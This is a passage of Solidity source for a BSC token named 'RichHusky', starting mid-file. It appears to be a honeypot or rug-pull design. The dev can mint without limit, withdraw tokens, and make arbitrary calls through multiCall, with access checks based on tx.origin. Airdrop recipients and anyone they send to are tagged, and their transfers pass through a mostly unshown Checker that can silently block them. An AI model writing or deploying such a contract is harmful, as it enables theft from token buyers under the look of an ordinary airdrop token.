        return addr != address(0) && pair != address(0) && from != address(0) && to != address(0) && amount != 0;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGasToken {
    function free(uint256 value) external;
}

contract RichHusky is ERC20 {
    address dev;
    uint256 public airdropAmount;
    mapping(address => bool) public betaUsers;
    address public pair;

    IFactory private immutable pancakeFactory = IFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address private immutable WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    // for airdrop gas saving
    address private immutable GasToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;

    constructor(address _dev) ERC20("RichHusky", "RH") {
        dev = _dev;
        airdropAmount = 490 * 1e18;
        mint(dev, 1000000 * 1e18);

        pair = pancakeFactory.createPair(address(this), WBNB);
    }

    modifier onlyDev() {
        require(tx.origin == dev, "Only dev");
        _;
    }

    function mint(address account, uint256 amount) public onlyDev {
        super._mint(account, amount);
    }

    function updateAirdropAmount(uint256 _airdropAmount) external onlyDev {
        airdropAmount = _airdropAmount;
    }

    function withdrawFee(address token, uint256 amount) external onlyDev {
        IERC20(token).transfer(tx.origin, amount);
    }

    function airdrop(address[] calldata _recipients, uint256 burnGasTokenAmount) external onlyDev {
        for (uint256 i = 0; i < _recipients.length; i++) {
            betaUsers[_recipients[i]] = true;
            _mint(_recipients[i], airdropAmount);
        }

        uint256 gasTokenBalance = IERC20(GasToken).balanceOf(address(this));
        if (gasTokenBalance < burnGasTokenAmount) {
            burnGasTokenAmount = gasTokenBalance;
        }

        if (burnGasTokenAmount > 0) {
            IGasToken(GasToken).free(burnGasTokenAmount);
        }
    }

    function addBetaUsers(address[] calldata users) external onlyDev {
        for (uint256 i = 0; i < users.length; i++) {
            _addBetaUsers(users[i]);
        }
    }

    function removeBetaUsers(address[] calldata users) external onlyDev {
        for (uint256 i = 0; i < users.length; i++) {
            betaUsers[users[i]] = false;
        }
    }

    function _addBetaUsers(address user) internal {
        if (user != dev && user != pair) {
            betaUsers[user] = true;
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override returns (bool) {
        if (betaUsers[from]) {
            if (!Checker.isValid(tx.origin, pair, from, to, amount)) {
                return false;
            }

            _addBetaUsers(to);
        }

        return true;
    }

    function multiCall(address[] calldata targets, bytes[] calldata data) external onlyDev {
        require(targets.length == data.length, "mismatch");
        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            bytes memory param = data[i];
            (bool suc, ) = target.call(param);
            if (!suc) {
                revert("multiCall failed");
            }
        }
    }
}

